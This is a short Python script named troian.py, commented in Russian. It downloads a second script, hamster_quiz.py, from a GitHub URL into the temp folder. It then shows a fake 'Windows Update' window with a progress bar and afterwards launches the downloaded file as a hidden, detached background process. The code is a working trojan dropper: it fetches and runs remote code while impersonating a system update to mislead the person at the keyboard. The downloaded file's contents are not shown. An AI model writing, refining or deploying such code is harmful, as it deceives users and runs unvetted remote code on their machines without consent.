# troian.py - ИСПРАВЛЕННАЯ ВЕРСИЯ (запускает викторину в отдельном процессе)
import os
import sys
import time
import requests
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox
from pathlib import Path

QUIZ_URL = "https://raw.githubusercontent.com/qwert369qwe/dvoian/main/hamster_quiz.py"
DOWNLOAD_PATH = Path(os.getenv('TEMP')) / "hamster_quiz.py"

def download_quiz():
    try:
        response = requests.get(QUIZ_URL, timeout=10)
        with open(DOWNLOAD_PATH, 'w', encoding='utf-8') as f:
            f.write(response.text)
        return True
    except Exception as e:
        print(f"Ошибка: {e}")
        return False

def run_quiz_detached():
    """Запускает викторину в ОТДЕЛЬНОМ процессе (не привязанном к cmd)"""
    try:
        if sys.platform == 'win32':
            # Windows: используем START /B для запуска в фоне
            subprocess.Popen(
                [sys.executable, str(DOWNLOAD_PATH)],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
            )
        else:
            # Linux/Mac
            subprocess.Popen(
                [sys.executable, str(DOWNLOAD_PATH)],
                start_new_session=True
            )
        return True
    except Exception as e:
        print(f"Ошибка запуска: {e}")
        return False

def show_fake_download():
    win = tk.Tk()
    win.title("Windows Update")
    win.geometry("450x200")
    win.configure(bg='#0078D7')
    win.resizable(False, False)
    
    tk.Label(win, text="ЦЕНТР ОБНОВЛЕНИЯ WINDOWS", 
             font=("Segoe UI", 12, "bold"), bg='#0078D7', fg='white').pack(pady=15)
    
    tk.Label(win, text="Установка критических обновлений...\nНе выключайте компьютер!",
             font=("Segoe UI", 9), bg='#0078D7', fg='white').pack()
    
    progress = ttk.Progressbar(win, length=350, mode='determinate')
    progress.pack(pady=20)
    
    status = tk.Label(win, text="0%", bg='#0078D7', fg='yellow')
    status.pack()
    
    def animate():
        for i in range(101):
            progress['value'] = i
            status.config(text=f"Загрузка... {i}%")
            win.update()
            time.sleep(0.02)
        win.destroy()
        run_quiz_detached()
    
    win.after(100, animate)
    win.mainloop()

if __name__ == "__main__":
    if download_quiz():
        show_fake_download()
    else:
        print("Не удалось скачать")
        input("Нажми Enter...")
